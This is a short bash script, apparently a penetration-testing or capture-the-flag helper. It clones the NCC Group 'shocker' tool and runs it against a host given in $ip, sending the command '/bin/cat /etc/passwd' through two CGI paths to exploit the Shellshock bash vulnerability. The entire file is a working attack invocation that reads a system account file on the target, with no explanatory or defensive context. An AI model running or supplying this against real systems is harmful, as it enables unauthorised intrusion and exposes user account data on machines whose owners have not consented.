#!/bin/bash

git clone https://github.com/nccgroup/shocker; cd shocker; ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose;  ./shocker.py -H $ip  --command "/bin/cat /etc/passwd" -c /cgi-bin/admin.cgi --verbose

